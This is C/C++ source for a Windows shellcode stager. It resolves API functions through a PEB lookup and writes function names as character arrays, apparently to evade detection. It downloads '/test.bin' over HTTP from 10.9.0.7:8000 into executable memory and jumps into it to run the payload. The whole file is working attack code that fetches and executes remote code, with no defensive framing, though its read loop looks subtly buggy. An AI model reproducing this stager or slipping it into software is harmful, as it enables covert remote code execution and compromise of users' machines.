#include <windows.h>
#include <stdio.h>
#include "peb-lookup.h"

typedef DWORD (__stdcall *LPTHREAD_START_ROUTINE) (LPVOID lpThreadParameter);
typedef LPVOID HINTERNET;
typedef WORD INTERNET_PORT;

extern "C"

int stager()
{
    wchar_t kernel32_dll_str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
    char load_lib_str[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 };
    char get_proc_str[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
    char virtual_alloc_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
    
    char wininet_dll_str[] = {'W','i','n','i','n','e','t','.','d','l','l',0};
    char internet_open_str[] = {'I','n','t','e','r','n','e','t','O','p','e','n','A',0};
    char internet_connect_str[] = {'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A',0};
    char http_open_request_str[] = {'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A',0};
    char http_send_request_str[] = {'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','A',0};
    char internet_read_str[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0};

    LPVOID pKernel32 = get_module_by_name((const LPWSTR)kernel32_dll_str);
    if (!pKernel32) {
        return 1;
    }

    // resolve loadlibraryA() address
    LPVOID pLoadLibrary = get_func_by_name((HMODULE)pKernel32, (LPSTR)load_lib_str);
    if (!pLoadLibrary) {
        return 2;
    }

    // resolve getprocaddress() address
    LPVOID pGetProcAddress = get_func_by_name((HMODULE)pKernel32, (LPSTR)get_proc_str);
    if (!pGetProcAddress) {
        return 3;
    }

    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR)) pLoadLibrary;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) pGetProcAddress;
    LPVOID(WINAPI * _VirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect) = (LPVOID(WINAPI*)(LPVOID,SIZE_T,DWORD,DWORD)) _GetProcAddress((HMODULE)pKernel32,virtual_alloc_str);
    
    LPVOID pWininet = _LoadLibraryA(wininet_dll_str);

    HINTERNET(WINAPI * _InternetOpenA)(LPCSTR lpszAgent,DWORD dwAccessType,LPCSTR lpszProxy,LPCSTR lpszProxyBypass,DWORD dwFlags) = (HINTERNET(WINAPI*)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD)) _GetProcAddress((HMODULE)pWininet,internet_open_str);
    HINTERNET(WINAPI * _InternetConnectA)(HINTERNET hInternet,LPCSTR lpszServerName,INTERNET_PORT nServerPort,LPCSTR lpszUserName,LPCSTR lpszPassword,DWORD dwService,DWORD dwFlags,DWORD_PTR dwContext) = (HINTERNET(WINAPI*)(HINTERNET,LPCSTR,INTERNET_PORT,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR)) _GetProcAddress((HMODULE)pWininet,internet_connect_str);
    HINTERNET(WINAPI * _HttpOpenRequestA)(HINTERNET hConnect,LPCSTR lpszVerb,LPCSTR lpszObjectName,LPCSTR lpszVersion,LPCSTR lpszReferrer,LPCSTR *lplpszAcceptTypes,DWORD dwFlags,DWORD_PTR dwContext) = (HINTERNET(WINAPI*)(HINTERNET,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR*,DWORD,DWORD_PTR)) _GetProcAddress((HMODULE)pWininet,http_open_request_str);
    BOOL(WINAPI * _HttpSendRequestA)(HINTERNET hRequest,LPCSTR lpszHeaders,DWORD dwHeadersLength,LPVOID lpOptional,DWORD dwOptionalLength) = (BOOL(WINAPI*)(HINTERNET,LPCSTR,DWORD,LPVOID,DWORD)) _GetProcAddress((HMODULE)pWininet,http_send_request_str);
    BOOL(WINAPI* _InternetReadFile)(HINTERNET hFile,LPVOID lpBuffer,DWORD dwNumberOfBytesToRead,LPDWORD lpdwNumberOfBytesRead) = (BOOL(WINAPI*)(HINTERNET,LPVOID,DWORD,LPDWORD)) _GetProcAddress((HMODULE)pWininet,internet_read_str);
    
    BOOL isRead = TRUE;
    DWORD bytes_received = 0;
    DWORD flag_reload = 0x80000000;
    DWORD flag_no_cache_write = 0x04000000;
    DWORD flag_keep_connection = 0x00400000;
    DWORD flag_no_auto_redirect = 0x00200000;
    DWORD flag_no_ui = 0x00000200;

    char ip[] = {'1','0','.','9','.','0','.','7',0};
    char method[] = {'G','E','T',0};
    char file[] = {'/','t','e','s','t','.','b','i','n',0};
    HINTERNET hInt = _InternetOpenA(NULL,0,NULL,NULL,0);
    HINTERNET hConnect = _InternetConnectA(hInt, ip,8000,NULL,NULL,3,NULL,NULL);
    HINTERNET hRequest = _HttpOpenRequestA(hConnect,method,file,NULL,NULL,NULL,flag_reload | flag_no_cache_write | flag_keep_connection | flag_no_auto_redirect | flag_no_ui,NULL);

    BOOL req = _HttpSendRequestA(hRequest,NULL,0,NULL,0);
    LPVOID buffer = _VirtualAlloc(NULL, 60222, MEM_COMMIT, 0x40);
    LPVOID base = buffer;
    DWORD offset = 0;
    while (isRead == TRUE)
    {
        DWORD dwByteRead;
        isRead = _InternetReadFile(hRequest,buffer,60223 - 1,&dwByteRead);
        offset += dwByteRead;
	    buffer = (LPVOID)((DWORD_PTR)buffer+offset);
        if (isRead == FALSE || dwByteRead == 0)
        {
            isRead = FALSE;
            break;
        }

    }
    void (*go)() = (void (*)()) base; go();
    return 0;
}



